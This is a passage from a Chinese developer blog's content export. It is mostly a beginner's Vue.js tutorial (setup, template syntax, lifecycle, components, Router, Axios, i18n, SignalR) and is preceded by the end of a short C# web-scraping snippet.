xxx.com是某网站的页面~（保护） var response = await httpClient.GetAsync(\u0026#34;https://xxx.com\u0026#34;); response.EnsureSuccessStatusCode(); var htmlContent = await response.Content.ReadAsStringAsync(); } } catch (HttpRequestException ex) { // 处理请求异常 ViewBag.Error = \u0026#34;Failed to retrieve price data: \u0026#34; + ex.Message; } 🚀模拟User-Agent // 生成随机 User-Agent private string GetUserAgent() { string[] userAgents = new string[] { \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.","title":".NET spider"},{"content":"前言 Vue.js，这个轻量级且灵活的JavaScript框架，就像一位魔术师，用它的魔法棒将数据和视图巧妙地连接在一起。当数据发生变化时，Vue.js就像变魔术一样，让视图自动更新，为开发者带来了极大的便利。\nVue.js的诞生，源于一位名叫尤雨溪的开发者对前端开发的热爱与追求。在Google工作期间，他受到了Angular的启发，决定开发一款更加轻量、灵活的框架。于是，Vue.js应运而生，它的名字来源于“View”的缩写，寓意着它专注于视图层的开发。Vue.js不断地完善和发展。它引入了响应式数据绑定、组件化开发等核心概念，让前端开发变得更加高效和可维护。\n👋 Vue环境搭建 首先，搭一个打代码的环境\n1.安装node.js 在使用VS Code之前，需要安装Vue的开发环境。\n安装Vue的最简单方法是使用npm包管理器，先安装Node.js和npm。\nnode官网 =\u0026gt; https://nodejs.org/en/download\n2.配置环境变量 在nodejs安装目录下新建node_cache（nodejs缓存）、node_global（全局包存放）两个文件夹，如下图所示。\n​​\n打开cmd命令提示符，配置文件路径如下：\n​​\n配置环境变量\n​​\n系统属性-\u0026gt;高级-\u0026gt;环境变量-\u0026gt;新增环境变量： ​​\n系统变量 ​​\n​​\n3.VSCode配置 Visual Studio Code\n以管理员身份运行VSCode\nVSCode安装插件ESLint\n安装js打包工具\nnpm install -g webpack ​​\n​​\n4.安装Vue CLI npm install -g vue-cli (vue-cli npm install @vue/cli -g --unsafe-perm) 5.在VS Code中打开Vue项目 5.1. 在VS Code中，File \u0026gt; Open Folder\u0026hellip; 选择“文件”\u0026gt; “打开文件夹”。 ​​\n5.2. 找到Vue项目文件夹，选择“文件夹”并打开。 ​​\n可以根据需要，在Extensions安装VSCode的中文扩展。\n5.3也可以通过Vue UI 创建一个新的Vue项目然后打开 vue ui ​​\n​​\n6.运行Vue项目 在VS Code中打开 Terminal 终端，切换到Vue项目文件夹，然后运行以下命令：\nnpm install ​​\ninstall --完会有node_modules npm run dev ​​\nnpm run serve npm run build ​​\n生成打包完会有dist文件夹放着打包好的文件\n可直接放到服务器上运行\n另外，也可通过 HBuilder 来敲代码 ​​\n内置浏览器\n👀 Vue基础学习 1.引入vue.js \u0026lt;script src=\u0026#34;vue.js\u0026#34; type=\u0026#34;text/javascript\u0026#34; charset=\u0026#34;utf-8\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; {{ message }} {{name}} {{himan}} \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var app = new Vue({ el: \u0026#39;#app\u0026#39;, data: { message: \u0026#39;Hello Vue!\u0026#39;, name : \u0026#34;Vue\u0026#34;, himan:\u0026#34;hhhhhhh\u0026#34; } }); \u0026lt;/script\u0026gt; ​``` ​​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041746.jpg\u0026#34;\u0026gt; ## 2.数据方法 ``` javascript \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; {{a}} \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var data = { a : 1 }; var vm = new Vue({ el : \u0026#34;#app\u0026#34;, data : data }); //data.a = 121212 vm.$watch(\u0026#39;a\u0026#39;, function(newVal, oldVal){ console.log(newVal, oldVal); }) vm.$data.a = \u0026#34;123123.\u0026#34; \u0026lt;/script\u0026gt; ​\n3.生命周期 每个 Vue 组件实例在创建时都需要经历一系列的初始化步骤，比如设置好数据侦听，编译模板，挂载实例到 DOM，以及在数据改变时更新 DOM。在此过程中，它也会运行被称为生命周期钩子的函数，让开发者有机会在特定阶段运行自己的代码。\nbefroreCreate 在实例初始化之后\n数据观测 (data observer) 和 event/watcher 事件配置之前被调用。\ncreated 在实例创建完成后被立即调用。\n在这一步，实例已完成以下的配置：数据观测 (data observer)，属性和方法的运算，watch/event 事件回调。\n然而，挂载阶段还没开始，$el 属性目前不可见。\nbeforeMount 在挂载开始之前被调用\n相关的渲染函数首次被调用\nmounted 在组件被挂载之后调用\nbeforeUpdate 数据更新时调用\nupdated //组件 DOM 已经更新, 组件更新完毕\n注意：生命周期不能用箭头函数\n\u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; {{msg}} \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var vm = new Vue({ el : \u0026#34;#app\u0026#34;, data : { msg : \u0026#34;hi vue\u0026#34;, }, beforeCreate:function(){ console.log(\u0026#39;beforeCreate\u0026#39;); }, created\t:function(){ console.log(\u0026#39;created\u0026#39;); }, beforeMount : function(){ console.log(\u0026#39;beforeMount\u0026#39;); }, mounted : function(){ console.log(\u0026#39;mounted\u0026#39;); }, beforeUpdate : function(){ console.log(\u0026#39;beforeUpdate\u0026#39;); }, updated : function(){ console.log(\u0026#39;updated\u0026#39;); } }); setTimeout(function(){ vm.msg = \u0026#34;change msg\u0026#34;; console.log(\u0026#34;change msg\u0026#34;); }, 10000); ​ ​​\n生命周期选项Vue.js =\u0026gt; https://cn.vuejs.org/api/options-lifecycle.html\n4.模板语法 v-bind v-html\njs表达式\n\u0026lt;p\u0026gt;{{ number + 1 }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{{ 1 == 1 ? \u0026#39;YES\u0026#39; : \u0026#39;NO\u0026#39; }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{{ message.split(\u0026#39;\u0026#39;).reverse().join(\u0026#39;\u0026#39;) }}\u0026lt;/p\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; {{msg}} \u0026lt;p\u0026gt;Using mustaches: {{ rawHtml }}\u0026lt;/p\u0026gt; \u0026lt;p v-html=\u0026#34;rawHtml\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;div v-bind:class=\u0026#34;color\u0026#34;\u0026gt;test...\u0026lt;/div\u0026gt; \u0026lt;p\u0026gt;{{ number + 1 }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{{ 1 == 1 ? \u0026#39;YES\u0026#39; : \u0026#39;NO\u0026#39; }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{{ message.split(\u0026#39;\u0026#39;).reverse().join(\u0026#39;\u0026#39;) }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var vm = new Vue({ el : \u0026#34;#app\u0026#34;, data : { msg : \u0026#34;hi vue\u0026#34;, rawHtml : \u0026#39;\u0026lt;span style=\u0026#34;color:red\u0026#34;\u0026gt;this is should be red\u0026lt;/span\u0026gt;\u0026#39;, color:\u0026#39;blue\u0026#39;, number : 10, ok : 1, message : \u0026#34;vue\u0026#34; } }); vm.msg = \u0026#34;hi....\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .red{color:red;} .blue{color:blue; font-size:14px;} \u0026lt;/style\u0026gt; ​​\nv-if @clikck @click.stop stop修饰 表示只执行click2\n\u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;p v-if=\u0026#34;seen\u0026#34;\u0026gt;HIHI\u0026lt;/p\u0026gt; \u0026lt;a v-bind:href=\u0026#34;url\u0026#34;\u0026gt;...\u0026lt;/a\u0026gt; \u0026lt;div @click=\u0026#34;click1\u0026#34; \u0026gt; \u0026lt;div @click.stop=\u0026#34;click2\u0026#34;\u0026gt; click me \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var vm = new Vue({ el : \u0026#34;#app\u0026#34;, data : { seen : false, url : \u0026#34;HTTPS://WWW.BAIDU.COM\u0026#34; }, methods:{ click1 : function () { console.log(\u0026#39;click1......\u0026#39;); }, click2 : function () { console.log(\u0026#39;click2......\u0026#39;); } } }); \u0026lt;/script\u0026gt; ​``` ​​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041749.jpg\u0026#34;\u0026gt; ## 5.对象语法 class style绑定 ``` html \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;test\u0026#34; v-bind:class=\u0026#34;[ isActive ? \u0026#39;active\u0026#39; : \u0026#39;\u0026#39;, isGreen ? \u0026#39;green\u0026#39; : \u0026#39;\u0026#39;]\u0026#34; style=\u0026#34;width:200px; height:200px; text-align:center; line-height:200px;\u0026#34;\u0026gt; hahaha \u0026lt;/div\u0026gt; \u0026lt;div :style=\u0026#34;{color:color, fontSize:size, background: isBlue ? \u0026#39;blue\u0026#39; : \u0026#39;\u0026#39;}\u0026#34;\u0026gt; hihihihi \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var vm = new Vue({ el : \u0026#34;#app\u0026#34;, data : { isActive : true, isGreen : true, color : \u0026#34;#111111\u0026#34;, size : \u0026#39;50px\u0026#39;, isRed : true, isBlue:true } }); \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; .test{font-size:30px;} .green{color:#00FF00;} .active{background:gray;} \u0026lt;/style\u0026gt; ​``` [2024041750] ## 6.条件渲染 v-if v-show ``` javascript \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;div v-if=\u0026#34;type === \u0026#39;A\u0026#39;\u0026#34;\u0026gt; A \u0026lt;/div\u0026gt; \u0026lt;div v-else-if=\u0026#34;type === \u0026#39;B\u0026#39;\u0026#34;\u0026gt; B \u0026lt;/div\u0026gt; \u0026lt;div v-else-if=\u0026#34;type === \u0026#39;C\u0026#39;\u0026#34;\u0026gt; C \u0026lt;/div\u0026gt; \u0026lt;div v-else\u0026gt; Not A/B/C \u0026lt;/div\u0026gt; \u0026lt;h1 v-show=\u0026#34;ok\u0026#34;\u0026gt;Hello!\u0026lt;/h1\u0026gt; \u0026lt;h1 v-show=\u0026#34;nok\u0026#34;\u0026gt;Hello!\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var vm = new Vue({ el : \u0026#34;#app\u0026#34;, data : { type : \u0026#34;D\u0026#34;, ok : true//ok : false } }); \u0026lt;/script\u0026gt; ​``` ​​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041751.jpg\u0026#34;\u0026gt; 如果需要频繁切换 ，用v-show show有写入dom ## 7.列表渲染 v-for ``` javascript \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;item,index in items\u0026#34; :key=\u0026#34;index\u0026#34;\u0026gt; {{index + 1 }} {{ item.message }} \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;value, key in object\u0026#34;\u0026gt; {{key}} : {{ value }} \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var vm = new Vue({ el : \u0026#34;#app\u0026#34;, data : { items : [ { message: \u0026#39;zhangsan\u0026#39; }, { message: \u0026#39;liwu\u0026#39; } ], object: { title: \u0026#39;tt\u0026#39;, author: \u0026#39;zhangsan\u0026#39;, createAt: \u0026#39;2024-01-01\u0026#39; } } }); \u0026lt;/script\u0026gt; ​``` ​​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041752.jpg\u0026#34;\u0026gt; ## 8.事件 ``` html \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;example-1\u0026#34;\u0026gt; \u0026lt;button v-on:click=\u0026#34;counter+=1\u0026#34;\u0026gt;数值: {{ counter }}\u0026lt;/button\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;button v-on:click=\u0026#34;greet(\u0026#39;abc\u0026#39;)\u0026#34;\u0026gt;Greet\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var vm = new Vue({ el :\u0026#34;#app\u0026#34; data :{ counter:0, name :\u0026#34;vue\u0026#34; }, methods:{ greet :function(str,e){ alert(\u0026#39;hi\u0026#39;); alert(this.name);} }); \u0026lt;/script\u0026gt; ​​\n9.表单绑定 \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;example-1\u0026#34;\u0026gt; \u0026lt;input v-model=\u0026#34;message\u0026#34; placeholder=\u0026#34;edit me\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Message is: {{ message }}\u0026lt;/p\u0026gt; \u0026lt;textarea v-model=\u0026#34;message2\u0026#34; placeholder=\u0026#34;add multiple lines\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;p style=\u0026#34;white-space: pre-line;\u0026#34;\u0026gt;{{ message2 }}\u0026lt;/p\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;div style=\u0026#34;margin-top:20px;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; id=\u0026#34;z\u0026#34; value=\u0026#34;z\u0026#34; v-model=\u0026#34;checkedNames\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;z\u0026#34;\u0026gt;z\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; id=\u0026#34;x\u0026#34; value=\u0026#34;x\u0026#34; v-model=\u0026#34;checkedNames\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;x\u0026#34;\u0026gt;x\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; id=\u0026#34;a\u0026#34; value=\u0026#34;a\u0026#34; v-model=\u0026#34;checkedNames\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;a\u0026#34;\u0026gt;a\u0026lt;/label\u0026gt; \u0026lt;br\u0026gt; \u0026lt;span\u0026gt;Checked names: {{ checkedNames }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div style=\u0026#34;margin-top:20px;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; id=\u0026#34;one\u0026#34; value=\u0026#34;One\u0026#34; v-model=\u0026#34;picked\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;one\u0026#34;\u0026gt;One\u0026lt;/label\u0026gt; \u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; id=\u0026#34;two\u0026#34; value=\u0026#34;Two\u0026#34; v-model=\u0026#34;picked\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;two\u0026#34;\u0026gt;Two\u0026lt;/label\u0026gt; \u0026lt;br\u0026gt; \u0026lt;span\u0026gt;Picked: {{ picked }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; @click=\u0026#34;submit\u0026#34;\u0026gt;提交\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var vm = new Vue({ el : \u0026#34;#app\u0026#34;, data : { message : \u0026#34;himsg\u0026#34;, message2 :\u0026#34;himsg2\u0026#34;, checkedNames : [\u0026#39;a\u0026#39;, \u0026#39;z\u0026#39;], picked : \u0026#34;Two\u0026#34; }, methods: { submit : function () { console.log(this.message + \u0026#34; \u0026#34;+this.message2 ); } } }); \u0026lt;/script\u0026gt; ​``` ​​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041754.jpg\u0026#34;\u0026gt; ## 10.组件基础 ``` javascript \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;button-counter title=\u0026#34;123\u0026#34;\u0026gt;\u0026lt;/button-counter\u0026gt; \u0026lt;button-counter title=\u0026#34;title1 \u0026#34; @clicknow=\u0026#34;clicknow\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;hi...h3\u0026lt;/h3\u0026gt; \u0026lt;/button-counter\u0026gt; \u0026lt;button-counter title=\u0026#34;title2 : \u0026#34;\u0026gt;\u0026lt;/button-counter\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; Vue.component(\u0026#39;button-counter\u0026#39;, { props: [\u0026#39;title\u0026#39;], data: function() { return { count: 0 } }, template: \u0026#39;\u0026lt;div\u0026gt;\u0026lt;h1\u0026gt;hi...\u0026lt;/h1\u0026gt;\u0026lt;button v-on:click=\u0026#34;clickfun\u0026#34;\u0026gt;{{title}} You clicked me {{ count }} times.\u0026lt;/button\u0026gt;\u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt;\u0026#39;, methods: { clickfun: function() { this.count++; this.$emit(\u0026#39;clicknow\u0026#39;, this.count);//传出去 } } }) var vm = new Vue({ el: \u0026#34;#app\u0026#34;, data: { }, methods: { clicknow: function(e) { console.log(e); }, } }); \u0026lt;/script\u0026gt; component(\u0026lsquo;xxx\u0026rsquo;,{}) xxx组件名称 {}对象内容\nprops:[\u0026ldquo;title\u0026rdquo;]定义属性\n插槽 可插入html标签\n\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; Vue.component(\u0026#39;button-counter\u0026#39;, { props: [\u0026#39;title\u0026#39;], data: function () { return {} }, template: \u0026#39;\u0026lt;div\u0026gt;\u0026lt;h1\u0026gt;hi...\u0026lt;/h1\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;, methods:{ } }) var vm = new Vue({ el : \u0026#34;#app\u0026#34;, data : { }, methods:{ clicknow : function (e) { console.log(e); } }, components:{ test : { template:\u0026#34;\u0026lt;h2\u0026gt;h2...\u0026lt;/h2\u0026gt;\u0026#34; } } }); \u0026lt;/script\u0026gt; Vue.component(\u0026lsquo;button-counter\u0026rsquo;\u0026hellip;是全局注册\ncomponents:{\u0026hellip; } 局部注册\n11.单文件组件 ​​\n\u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;Hello, Vue!\u0026lt;/h1\u0026gt; \u0026lt;HelloWorld /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; // 引入 HelloWorld 组件 import HelloWorld from \u0026#39;./HelloWorld.vue\u0026#39;; export default { name: \u0026#39;App\u0026#39;, components: { // 注册引入的组件 HelloWorld } } \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; /* 样式 */ \u0026lt;/style\u0026gt; 🌱Vue组件学习 Vue Router Vue Router 是 Vue.js 官方的路由管理器。它允许构建单页应用（SPA），在不同的 URL 之间进行导航，同时还可以实现诸如路由参数、嵌套路由、路由导航守卫等功能。\n1.安装 Vue Router npm install vue-router 2.router.js Vue 项目中，需要创建一个路由实例并将其挂载到 Vue 实例上。通常情况下，名为 router.js 或者类似的文件中定义路由，然后在主 Vue 实例中引入它。\n// router/index.js import { createRouter, createWebHistory } from \u0026#39;vue-router\u0026#39; import Login from \u0026#39;../components/Login.vue\u0026#39; import Setting from \u0026#39;../components/Setting.vue\u0026#39; import UserManagement from \u0026#39;../components/UserManagement.vue\u0026#39; import imtest from \u0026#39;../components/WebIMTest.vue\u0026#39; const routes = [ { path: \u0026#39;/Login\u0026#39;, component: Login }, // _ // 设置空默认路由为Login.vue { path: \u0026#39;/Setting\u0026#39;, component: Setting }, { path: \u0026#39;/UserManagement\u0026#39;, component: UserManagement }, { path: \u0026#39;/imtest\u0026#39;, component: imtest } ] const router = createRouter({ history: createWebHistory(), routes }) export default router createRouter 函数用于创建路由实例，而 createWebHistory 函数则用于创建基于 HTML5 History API 的路由模式，也就是使用浏览器的 History API 来处理 URL 的变化\n3.引入路由实例 Vue 实例中，需要引入这个路由实例，并将其应用到 Vue 实例中。\n// main.js import Vue from \u0026#39;vue\u0026#39;; import App from \u0026#39;./App.vue\u0026#39;; import router from \u0026#39;./router\u0026#39;; const app = createApp(App) app.use(router) // 使用路由 app.mount(\u0026#39;#app\u0026#39;) 4.路由导航 可以使用 来实现路由导航，使用 来渲染当前路由匹配到的组件。\n\u0026lt;!-- App.vue --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;router-link to=\u0026#34;/login\u0026#34; class=\u0026#34;nav-link\u0026#34;\u0026gt;Login\u0026lt;/router-link\u0026gt; \u0026lt;router-link to=\u0026#34;/setting\u0026#34; class=\u0026#34;nav-link\u0026#34;\u0026gt;Setting\u0026lt;/router-link\u0026gt; \u0026lt;router-view\u0026gt;\u0026lt;/router-view\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { name: \u0026#39;App\u0026#39; }; \u0026lt;/script\u0026gt; 5.运行实例 ​​\n点击Setting 则来到/setting ， 展示的是Setting的内容\nAxios Axios 是一个流行的基于 Promise 的 HTTP 客户端，用于浏览器和 Node.js 环境。它允许你以简单、直观的方式发送异步HTTP请求，并处理响应。Axios 具有许多功能，包括：\n支持 Promise API：Axios使用Promise对象进行异步操作的处理，使得代码更加清晰和易于理解。\n支持浏览器和Node.js：Axios可以在浏览器和Node.js环境中使用，这使得它成为跨平台开发的理想选择。\n拦截请求和响应：你可以在发送请求或接收响应时，使用拦截器对请求或响应进行全局处理。\n自动转换JSON数据：Axios会自动将接收到的JSON数据转换为JavaScript对象，方便在代码中进行处理。\n取消请求：Axios允许你取消未完成的HTTP请求，防止不必要的网络请求。\n客户端端口支持防止CSRF：Axios可以自动识别和处理CSRF保护。\n错误处理：Axios提供了丰富的错误处理机制，方便你处理各种网络请求可能出现的错误。\n适用于前端和后端开发，使得发送和处理HTTP请求变得更加简单和高效。\n1.安装Axios 可以通过npm或者yarn进行安装。\nnpm install axios 2.引入axios import axios from \u0026#39;axios\u0026#39;; 3.axios请求方法 \u0026lt;script\u0026gt; import axios from \u0026#39;axios\u0026#39;; export default { methods: { AxiosTest() { const url = \u0026#39;/api/getLogByID\u0026#39;; const id = \u0026#39;3\u0026#39;; // 使用Axios发送GET请求 axios.get(url, { params: { id: id } }) .then(response =\u0026gt; { // 请求成功时的处理逻辑 console.log(response.data); // 输出获取到的日志数据 }) .catch(error =\u0026gt; { // 请求失败时的处理逻辑 console.error(\u0026#39;There was an error!\u0026#39;, error); }); } }; \u0026lt;/script\u0026gt; 4.调用方法 在Vue模板中调用方法：通过事件绑定或其他方式来调用上面定义的方法。\n\u0026lt;button @click=\u0026#34;AxiosTest\u0026#34;\u0026gt;获取 \u0026lt;/button\u0026gt; 5.运行实例 ​​\n户点击按钮时，AxiosTest方法被调用，它会使用Axios发送GET请求来调用GetLogByID方法，并处理返回的数据或错误。 console.log 输出 返回的数据\nVue-i18n 国际化 在Vue应用中使用Vue I18n时，可以按照以下步骤操作：\n1.安装Vue I18n 首先，需要安装Vue I18n。可以通过npm或者yarn来安装Vue I18n\nnpm install vue-i18n or\nyarn add vue-i18n 2.创建语言文件 接下来，创建语言文件。这些文件可以是JSON格式的，用来存储不同语言的翻译信息。例如en.json、zh.json和fr.json等文件，分别存储英语、中文和法语的信息。\n// en.json { \u0026#34;Welcome\u0026#34;: \u0026#34;Welcome\u0026#34;, \u0026#34;Login\u0026#34;: \u0026#34;Login\u0026#34;, \u0026#34;Setting\u0026#34;: \u0026#34;Setting\u0026#34;, } // en.json { \u0026#34;Welcome\u0026#34;: \u0026#34;Welcome\u0026#34;, \u0026#34;Login\u0026#34;: \u0026#34;Login\u0026#34;, \u0026#34;Setting\u0026#34;: \u0026#34;Setting\u0026#34;, } // zh.json { \u0026#34;Welcome\u0026#34;: \u0026#34;欢迎\u0026#34;, \u0026#34;Login\u0026#34;: \u0026#34;登录\u0026#34;, \u0026#34;Setting\u0026#34;: \u0026#34;设置\u0026#34;, } 3.在Vue组件中使用Vue I18n 在Vue组件中引入Vue I18n，并创建一个实例。\n// main.js import { createApp } from \u0026#39;vue\u0026#39; import App from \u0026#39;./App.vue\u0026#39; import { createI18n } from \u0026#39;vue-i18n\u0026#39; import router from \u0026#39;./router\u0026#39; // 引入语言文件 import en from \u0026#39;./locales/en.json\u0026#39; import zh from \u0026#39;./locales/zh.json\u0026#39; import fr from \u0026#39;./locales/fr.json\u0026#39; // 创建 Vue I18n 实例 const i18n = createI18n({ locale: \u0026#39;en\u0026#39;, // 默认语言 messages: { en, zh, fr } }) // 创建 Vue 应用实例 const app = createApp(App) // 使用 Vue I18n 和路由 app.use(i18n) app.use(router) // 挂载应用 app.mount(\u0026#39;#app\u0026#39;) 4.在组件中使用翻译 使用 $t 方法来进行翻译。\n\u0026lt;!-- HelloWorld.vue --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;{{ $t(\u0026#39;Welcome\u0026#39;) }}\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;{{ $t(\u0026#39;Login\u0026#39;) }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{{ $t(\u0026#39;Setting\u0026#39;) }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { } \u0026lt;/script\u0026gt; 5.切换语言： 最后，通过修改Vue I18n实例的locale属性来切换语言。 // 切换到中文 i18n.global.locale = \u0026#39;zh\u0026#39;; // 切换到法语 i18n.global.locale = \u0026#39;fr\u0026#39;; 在2.创建语言文件时也可以只创建一个json，减少后续维护成本如： // lan.json { \u0026#34;en\u0026#34;: { \u0026#34;Welcome\u0026#34;: \u0026#34;Welcome\u0026#34;, \u0026#34;Login\u0026#34;: \u0026#34;Login\u0026#34;, \u0026#34;Setting\u0026#34;: \u0026#34;Setting\u0026#34;, \u0026#34;UserManagement\u0026#34;: \u0026#34;User Management\u0026#34; }, \u0026#34;zh\u0026#34;: { \u0026#34;Welcome\u0026#34;: \u0026#34;欢迎\u0026#34;, \u0026#34;Login\u0026#34;: \u0026#34;登录\u0026#34;, \u0026#34;Setting\u0026#34;: \u0026#34;设置\u0026#34;, \u0026#34;UserManagement\u0026#34;: \u0026#34;用户管理\u0026#34; }, \u0026#34;fr\u0026#34;: { \u0026#34;Welcome\u0026#34;: \u0026#34;Bienvenue\u0026#34;, \u0026#34;Login\u0026#34;: \u0026#34;Connexion\u0026#34;, \u0026#34;Setting\u0026#34;: \u0026#34;Réglage\u0026#34;, \u0026#34;UserManagement\u0026#34;: \u0026#34;Gestion des utilisateurs\u0026#34; }, \u0026#34;ru\u0026#34;: { \u0026#34;Welcome\u0026#34;: \u0026#34;Добро пожаловать\u0026#34;, \u0026#34;Login\u0026#34;: \u0026#34;Войти\u0026#34;, \u0026#34;Setting\u0026#34;: \u0026#34;Настройки\u0026#34;, \u0026#34;UserManagement\u0026#34;: \u0026#34;Управление пользователями\u0026#34; }, \u0026#34;hk\u0026#34;: { \u0026#34;Welcome\u0026#34;: \u0026#34;歡迎\u0026#34;, \u0026#34;Login\u0026#34;: \u0026#34;登錄\u0026#34;, \u0026#34;Setting\u0026#34;: \u0026#34;設置\u0026#34;, \u0026#34;UserManagement\u0026#34;: \u0026#34;用戶管理\u0026#34;, } } //main.js import translations from \u0026#39;./lan.json\u0026#39; // 创建 Vue I18n 实例 const i18n = createI18n({ locale: \u0026#39;en\u0026#39;, // 默认语言 messages: translations }) 5.运行实例 ​​\n​​\nVue-SignalR 实时通讯 在Vue应用中使用SignalR，可以按照以下步骤进行\n1.安装SignalR客户端库 首先，需要安装SignalR的JavaScript客户端库。可以通过npm或者yarn来安装。\nnpm install @microsoft/signalr or\nyarn add @microsoft/signalr 2.在Vue组件中使用SignalR 在Vue组件中引入SignalR库，并创建一个SignalR连接，然后订阅服务器发送的消息。\n\u0026lt;script\u0026gt; import { HubConnectionBuilder } from \u0026#39;@microsoft/signalr\u0026#39;; export default { data() { return { messageText: \u0026#39;\u0026#39;, hubConnection: null, messages: [] }; }, methods: { sendMessage() { if (!this.messageText) return; // 发送消息给SignalR Hub this.hubConnection.invoke(\u0026#39;SendMessage2\u0026#39;,\u0026#39;user1\u0026#39;, this.messageText) .then(() =\u0026gt; { console.log(\u0026#39;Message sent: \u0026#39;, this.messageText); // 清空输入框 this.messageText = \u0026#39;\u0026#39;; }) .catch(error =\u0026gt; { console.error(\u0026#39;Error sending message: \u0026#39;, error); }); } }, created() { this.hubConnection = new HubConnectionBuilder() .withUrl(\u0026#34;/chatHub\u0026#34;) // SignalR Hub的URL .build(); this.hubConnection.start() .then(() =\u0026gt; console.log(\u0026#34;SignalR connection established.\u0026#34;)) .catch(err =\u0026gt; console.error(\u0026#34;SignalR connection failed: \u0026#34;, err)); this.hubConnection.on(\u0026#34;ReceiveMessage\u0026#34;, (user, message) 